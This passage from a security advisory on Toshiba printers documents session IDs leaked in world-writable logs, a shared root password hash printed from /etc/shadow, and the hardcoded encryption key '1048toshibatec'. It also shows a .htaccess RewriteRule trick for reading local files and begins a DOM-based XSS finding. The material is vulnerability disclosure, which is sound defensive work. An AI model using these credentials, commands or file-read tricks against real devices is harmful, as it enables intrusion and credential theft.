./log/al/boserver.log.0.txt:05/30 15:50:14745065 Pid= 1657,Tid= 1783,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'LicenseEnableCheck' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/aldeviceconfig.log.0.txt:  * SessionID         : ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
./log/al/aldeviceconfig.log.0.txt:  * DeltaDocName      : hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/DiagnosticModeTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
[...]
./log/al/aldeviceconfig.log.0.txt:  * DeltaDocName      : hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/DiagnosticModeTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
./log/al/sapp/python_settingapp.log:03/16 20:57:34966 Pid= 5653 Tid= 1820326768 tweens.py       176 WARNING Add session map. key = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7 value = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7
./log/al/sapp/python_settingapp.log:03/16 21:08:35016 Pid= 5653 Tid= 1675623280 tweens.py       347 WARNING Delete session map. key = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7 value = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7, length1
./log/al/authplugin.log.0.txt:05/30 15:16:07935854 Pid= 1872,UserAuthManger.cpp:11476:ERR:delta Doc Name::hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/AuthenticationTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
[...]
./log/al/renderer.log.1.txt:05/30 20:21:13780508 Pid= 1992,Tid= 2939,LegacyPanel/src/cpanelmanager.cpp: 2983:WRN:Rcv ST : 72 : 1c000001 : &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Notification&gt;&lt;Payload model="pull"&gt;&lt;path&gt;SecurityConfiguration/SecuritySettings/isLoginReqd&lt;/path&gt;&lt;sessionID&gt;ContentWebServer_10.0.0.2.ab52ced8304357f2b382460bbdd797dc&lt;/sessionID&gt;&lt;subscriptionID&gt;1275&lt;/subscriptionID&gt;&lt;/Payload&gt;&lt;/Notification&gt;
[...]
/log/al/prm.log.0.txt:05/30 15:18:16563007 Pid= 1885,Tid= 2163,manager.cpp: 1874:ERR:Delta Document hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/PresentationResourcesTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e could not be opened. Creating it
</code></pre>
<p>We can list the files containing such authentication sessions:</p>
<ul>
<li>log/al/aldeviceconfig.log.0.txt</li>
<li>log/al/appmanager.log.0.txt</li>
<li>log/al/appmanagerlibrary.log.0.txt</li>
<li>log/al/authplugin.log.0.txt</li>
<li>log/al/boserver.log.0.txt</li>
<li>log/al/boserverEvent.log.26.txt</li>
<li>log/al/epfx/eprocessframework.log.0.txt</li>
<li>log/al/prm.log.0.txt</li>
<li>log/al/renderer.log.0.txt</li>
<li>log/al/renderer.log.1.txt</li>
<li>log/al/renderer.log.2.txt</li>
<li>log/al/sapp/python_settingapp.log</li>
<li>log/al/webpanel/eapi.log.0.txt</li>
</ul>
<p>Using the shell:</p>
<pre><code>bash-4.1# grep -r '10.0.0.2\.' * | sed -e 's#:# #' | awk '{ print $1 }' | sort | uniq
log/al/aldeviceconfig.log.0.txt
log/al/appmanager.log.0.txt
log/al/appmanagerlibrary.log.0.txt
log/al/authplugin.log.0.txt
log/al/boserver.log.0.txt
log/al/boserverEvent.log.26.txt
log/al/epfx/eprocessframework.log.0.txt
log/al/prm.log.0.txt
log/al/renderer.log.0.txt
log/al/renderer.log.1.txt
log/al/renderer.log.2.txt
log/al/sapp/python_settingapp.log
log/al/webpanel/eapi.log.0.txt
log/al/webpanel/python_ta.log
</code></pre>
<p>These files have insecure permissions allowing any user to retrieve the passwords, and some files can be freely modified by any local attacker (or any remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability):</p>
<p>Insecure permissions for log files:</p>
<pre>
bash-4.1# for i in $(grep -r '10.0.0.2\.' * | sed -e 's#:# #' | awk '{ print $1 }' | sort | uniq); do ls -la $i;done
<font color=red>-rw-r--r--</font> 1 apache trusted 177116 May 30 15:51 log/al/aldeviceconfig.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 57508 May 30 15:51 log/al/appmanager.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 285227 May 30 16:15 log/al/appmanagerlibrary.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 8839 May 30 15:51 log/al/authplugin.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 57082 May 30 15:51 log/al/boserver.log.0.txt
<font color=red>-rwxr-xr-x</font> 1 apache trusted 850786 May 30 15:51 log/al/boserverEvent.log.26.txt
<font color=red>-rwxr-xr-x</font> 1 apache trusted 18608 May 30 15:51 log/al/epfx/eprocessframework.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 18151 May 30 15:51 log/al/prm.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 1048682 May 30 19:28 log/al/renderer.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 1048606 May 30 21:50 log/al/renderer.log.1.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 527501 May 30 15:51 log/al/renderer.log.2.txt
<font color=red>-rwxrwxrwx</font> 1 apache trusted 1958 May 30 21:08 log/al/sapp/python_settingapp.log
<font color=red>-rwxrwxrwx</font> 1 root trusted 669880 May 30 16:15 log/al/webpanel/eapi.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 apache trusted 311373 May 30 15:53 log/al/webpanel/python_ta.log
</pre>

<p>An attacker can retrieve authentication sessions.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="sessions-logs-02"></a></p>
<h2>Details - Leak of authentication sessions in insecure logs in /ramdisk/al/network/log directory</h2>
<p>It was observed that the sessions are stored in clear-text logs. These logs are world-readable and some can also be freely modified by any local attacker.</p>
<p>Some logs are stored inside the <code>/ramdisk/al/network/log</code> directory with insecure permissions. We can find the authentication sessions inside:</p>
<pre>
bash-4.1# pwd
/ramdisk/al/network/log
bash-4.1# ls -la
total 184
drwxr-xr-x 6 root root        0 May 30 10:38 .
drwxr-xr-x 7 root root        0 May 30 10:39 ..
-rw-rw-rw- 1 root trusted  1455 May 30 10:38 dibbler-client.log
-rw-rw-rw- 1 root trusted 23051 May 30 16:48 hp9100.log.0.txt
-rw-rw-rw- 1 root trusted 58886 May 30 17:29 http.log
-rw-rw-rw- 1 root trusted  6143 May 30 17:29 http_access.log
-rw-rw-rw- 1 root trusted  9194 May 30 14:08 https.log
-rw-rw-rw- 1 root trusted   962 May 30 15:01 lprng.log.0.txt
-rw-r----- 1 root adm      8767 May 30 16:38 maillog
-rw-rw-rw- 1 root trusted 58619 May 30 17:23 nqlog.log
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsd
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsm
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsp
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsscn
bash-4.1# grep SessionID *
http.log:[Thu May 30 17:29:08.209477 2023] [contentwebserver:debug] [pid 5113] ccontentwebserver.cpp(1130): [client 10.0.0.2:43384] CContentWebServer:: SessionID=[<font color=red>ContentWebServer_10.0.0.2.874eef7e817c9d053cbdc618d850ab61</font>]   ignoreSessionTimeout=[IgnoreSessionTimeout], referer: http://10.0.0.1:8080/
http.log:[Thu May 30 17:29:08.739761 2023] [contentwebserver:debug] [pid 5118] ccontentwebserver.cpp(1130): [client 10.0.0.2:43386] CContentWebServer:: SessionID=[<font color=red>ContentWebServer_10.0.0.2.874eef7e817c9d053cbdc618d850ab61</font>]   ignoreSessionTimeout=[IgnoreSessionTimeout], referer: http://10.0.0.1:8080/FrameIndex.html?v=1670282309ta
[...]
bash-4.1# grep -i cookie *
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 12:49:00.729591 2023] [contentwebserver:error] [pid 5121] [client 10.0.0.2:50619] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 12:49:00.729632 2023] [contentwebserver:error] [pid 5121] [client 10.0.0.2:50619] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.2.289d834d7086d004ce9a710590e10be1</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 14:08:17.935840 2023] [contentwebserver:error] [pid 5113] [client 10.0.0.3:62840] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 14:08:17.935870 2023] [contentwebserver:error] [pid 5113] [client 10.0.0.3:62840] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.3.117f8affdaee98da7f6c4d073bd2ab8d</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 14:08:20.603084 2023] [contentwebserver:error] [pid 5118] [client 10.0.0.4.75:62843] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 14:08:20.603114 2023] [contentwebserver:error] [pid 5118] [client 10.0.0.4:62843] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.4.140ee80f33943e90ea27be3fc3c511fb</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
</pre>

<p>We can list the files containing such authentication sessions:</p>
<ul>
<li>al/network/log/http*</li>
</ul>
<p>This file has insecure permissions allowing any user to retrieve the passwords and some files can be freely modified by any local attacker (or any remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability):</p>
<p>Insecure log files:</p>
<pre>
bash-4.1# pwd
/ramdisk/al/network/log
bash-4.1# ls -la
total 184
drwxr-xr-x 6 root root        0 May 30 10:38 .
drwxr-xr-x 7 root root        0 May 30 10:39 ..
<font color=red>-rw-rw-rw-</font> 1 root trusted  1455 May 30 10:38 dibbler-client.log
<font color=red>-rw-rw-rw-</font> 1 root trusted 23051 May 30 16:48 hp9100.log.0.txt
<font color=red>-rw-rw-rw-</font> 1 root trusted 58886 May 30 17:29 http.log
<font color=red>-rw-rw-rw-</font> 1 root trusted  6143 May 30 17:29 http_access.log
<font color=red>-rw-rw-rw-</font> 1 root trusted  9194 May 30 14:08 https.log
<font color=red>-rw-rw-rw-</font> 1 root trusted   962 May 30 15:01 lprng.log.0.txt
-rw-r----- 1 root adm      8767 May 30 16:38 maillog
<font color=red>-rw-rw-rw-</font> 1 root trusted 58619 May 30 17:23 nqlog.log
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsd
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsm
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsp
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsscn
</pre>

<p>An attacker can retrieve authentication sessions.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="hardcoded-root-password"></a></p>
<h2>Details - Hardcoded root password</h2>
<p>All the Toshiba printers share the same hardcoded root password. This hardcoded password is written by default in the firmware image and cannot be modified. Furthermore, the hash was also found in firmware images from 2017, meaning this password was never updated:</p>
<p>Content of <code>/etc/shadow</code>:</p>
<pre><code>bash-4.1# cat /etc/shadow
root:$6$rsDekYom2xF0b$T./E5cKsgXixcqB6ULMv1f1/AztBn86Lt7Uv1MTS7LynR325iUIb9ql2A0UCHUzPLavlPnfsi/gOoJTosjo230:11323:0:99999:7:::
bin:!!:12571:0:99999:7:::
daemon:!!:12571:0:99999:7:::
adm:!!:12571:0:99999:7:::
lp:!!:12571:0:99999:7:::
sync:!!:12571:0:99999:7:::
shutdown:!!:12571:0:99999:7:::
halt:!!:12571:0:99999:7:::
mail:!!:12571:0:99999:7:::
uucp:!!:12571:0:99999:7:::
operator:!!:12571:0:99999:7:::
games:!!:12571:0:99999:7:::
gopher:!!:12571:0:99999:7:::
ftp:!!:12571:0:99999:7:::
hacluster:!!:12571:0:99999:7:::
rpcuser:!!:12571:0:99999:7:::
ntp:!!:12571:0:99999:7:::
smmsp:!:19431:0:99999:7:::
vcsa:!!:12571:0:99999:7:::
sshd:!!:12571:0:99999:7:::
nobody:!!:12571:0:99999:7:::
nfsnobody:!!:12571:0:99999:7:::
uuidd:x:19431:0:99999:7:::
messagebus:!:19431::::::
apache:!:19431:0:99999:7:::
sh-4.1#
</code></pre>
<p>An attacker can remotely compromise any Toshiba printer if the telnetd or the openssh servers are running.</p>
<p><a id="harcoded-password-logs"></a></p>
<h2>Details - Hardcoded password used to encrypt logs</h2>
<p>It was observed that all the Toshiba printers contain a shell script using the same hardcoded key to encrypt logs.</p>
<p>The script <code>/home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh</code> has insecure permissions and contains the hardcoded key <code>1048toshibatec</code>:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh
<font color=red>-rwxrwxrwx</font> 1 root root 95309 Nov  8  2021 /home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh
bash-4.1#
</pre>

<p>Content of the file:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">1908</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Start Collected Log Encryption&quot;</span>
<span style="color: #666666">1909</span> openssl enc -e -aes256 -in <span style="color: #19177C">$MOUNTPOINT</span>/<span style="color: #19177C">$SERIAL</span>.<span style="color: #19177C">$date</span>.tar.gz -out <span style="color: #19177C">$MOUNTPOINT</span>/<span style="color: #19177C">$SERIAL</span>.<span style="color: #19177C">$date</span> -k 1048toshibatec
<span style="color: #666666">1910</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[</span> <span style="color: #19177C">$?</span> -eq <span style="color: #666666">1</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">1911</span>      <span style="color: #008000">exit</span> <span style="color: #666666">1</span>     
<span style="color: #666666">1912</span> <span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
</pre></div>

<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p><a id="harcoded-password-logs-weak-cipher"></a></p>
<h2>Details - Hardcoded password used to encrypt logs and use of a weak digest cipher</h2>
<p>It was observed that all the Toshiba printers contain a shell script using the same hardcoded key to encrypt logs.</p>
<p>The script <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code> has insecure permissions and contains the hardcoded key <code>1048toshibatec</code>:</p>
<p>Insecure Permissions of <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh
<font color=red>-rwxrwxrwx</font> 1 root root 115474 Nov  8  2021 /home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh
bash-4.1#
</pre>

<p>In this file, we can find several hardcoded keys and the insecure use of MD5 as a digest cipher (<code>-md md5</code>) to derivate the secret key: </p>
<p>Content of <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">1986</span> archiveLogECC<span style="color: #666666">()</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2002</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG -k 1048toshibatec; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2020</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA -k 1048toshibatec ; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2029</span> archiveLogEmail<span style="color: #666666">()</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2056</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG -k 1048toshibatec ;<span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2081</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA -k 1048toshibatec;<span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2426</span>     <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$ENCRYPTED_FILE</span><span style="color: #BA2121">&quot;.tar.gz&quot;</span> -out <span style="color: #19177C">$ENCRYPTED_FILE</span> -k 1048toshibatec -md md5; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
</pre></div>

<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p>The MD5 algorithm is insecure.</p>
<p><a id="harcoded-password-files"></a></p>
<h2>Details - Hardcoded password used to encrypt files</h2>
<p>It was observed that all the Toshiba printers have programs containing a hardcoded key used to encrypt files:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/bin/alreportmanager</code></li>
<li><code>/home/SYSROM_SRC/build/release/bin/alusermgr</code></li>
</ul>
<p>These 2 programs use the hardcoded key <code>1048toshibatec</code> to generate files.</p>
<p>In the alreportmanager program, this key is used inside the <code>al::reporting::ReportGenerator::EncryptFile(std::string *a1, const char **a2, const char **a3)</code> method to encrypt files.</p>
<p>In the alusermgr program, this key is used in several methods to encrypt files. We can identify the references to his strings:</p>
<p><img alt="" src="images/2024-toshiba-xref-hardcoded-key-alusermgr.png" /></p>
<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p><a id="dom-xss"></a></p>
<h2>Details - DOM-based XSS present in the /js/TopAccessUtil.js file</h2>
<p>All the Toshiba printers provide a web interface that will load the <code>/js/TopAccessUtil.js</code> JavaScript file. This <code>/js/TopAccessUtil.js</code> JavaScript file contains insecure codes vulnerable to XSS and is loaded inside all the webpages provided by the printer:</p>
<p>Content of http://ip:8080/?MAIN=TOPACCESS:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="color: #008000; font-weight: bold">html</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">head</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">meta</span> <span style="color: #7D9029">http-equiv</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;X-UA-Compatible&quot;</span> <span style="color: #7D9029">content</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;IE=Edge&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">http-equiv</span><span style="color: #666666">=</span><span style="color: #BA2121">Content-Type</span> <span style="color: #7D9029">content</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/html; charset=windows-1252&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;cache-Control: private&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;NO-CACHE&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;PRAGMA&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;NO-CACHE&quot;</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;Expires&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;1&quot;</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">link</span> <span style="color: #7D9029">rel</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;stylesheet&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/css&quot;</span> <span style="color: #7D9029">href</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;styles/style.css?v=1670278837ta&quot;</span>&gt;
    <span style="color: #408080; font-style: italic">&lt;!--&lt;title class=&quot;clsTitle1&quot;&gt;TopAccess&lt;/title&gt;--&gt;</span>
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/Cookies.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/localization/Locale_languages_installed.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/localization.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">SCRIPT</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/AjaxReqRespHandler.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">SCRIPT</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;
    <span style="color: #008000; font-weight: bold">var</span> gblTopWindow;
    <span style="color: #008000; font-weight: bold">var</span> backspacePressed;
    <span style="color: #008000; font-weight: bold">var</span> subMenuLoaded <span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">false</span>;
    <span style="color: #008000; font-weight: bold">if</span>(location.href.indexOf(<span style="color: #BA2121">&quot;?MAIN=EFILING&quot;</span>) <span style="color: #666666">==</span> <span style="color: #666666">-1</span>){
        <span style="color: #008000">window</span>.opener <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>;
        gblTopWindow<span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">true</span>;
    }   
    &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">SCRIPT</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/TopAccessUtil.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">SCRIPT</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;
</pre></div>

<p>The <code>/js/TopAccessUtil.js</code> file contains the vulnerable <code>getQueryStringValue()</code> function that will take arguments from the URL and will return them without any sanitization:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">565</span> <span style="color: #008000; font-weight: bold">function</span> getQueryStringValue(varname,locationType) {
 <span style="color: #666666">566</span>         <span style="color: #008000; font-weight: bold">try</span> {
 <span style="color: #666666">567</span>             <span style="color: #408080; font-style: italic">/* locationType is a param which has enumeration (&quot;parent&quot; &amp; &quot;self&quot; &amp; &quot;top&quot;)   */</span>
 <span style="color: #666666">568</span>             <span style="color: #008000; font-weight: bold">var</span> strloc <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">569</span>             <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">||</span> locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;parent&quot;</span>){
 <span style="color: #666666">570</span>                 strloc <span style="color: #666666">=</span> parent.location.href;
 <span style="color: #666666">571</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;top&quot;</span>){
 <span style="color: #666666">572</span>                 strloc <span style="color: #666666">=</span> top.location.href;
 <span style="color: #666666">573</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;self&quot;</span>){
 <span style="color: #666666">574</span>                 strloc <span style="color: #666666">=</span> location.href;
 <span style="color: #666666">575</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;parent.parent&quot;</span>) {
 <span style="color: #666666">576</span>                 strloc <span style="color: #666666">=</span> parent.parent.location.href;
 <span style="color: #666666">577</span>             }
 <span style="color: #666666">578</span>             <span style="color: #008000; font-weight: bold">if</span>(strloc.indexOf(<span style="color: #BA2121">&quot;?&quot;</span>)<span style="color: #666666">==</span> <span style="color: #666666">-1</span> <span style="color: #666666">&amp;&amp;</span> strloc.indexOf(<span style="color: #BA2121">&quot;#&quot;</span>)<span style="color: #666666">==</span> <span style="color: #666666">-1</span>) {
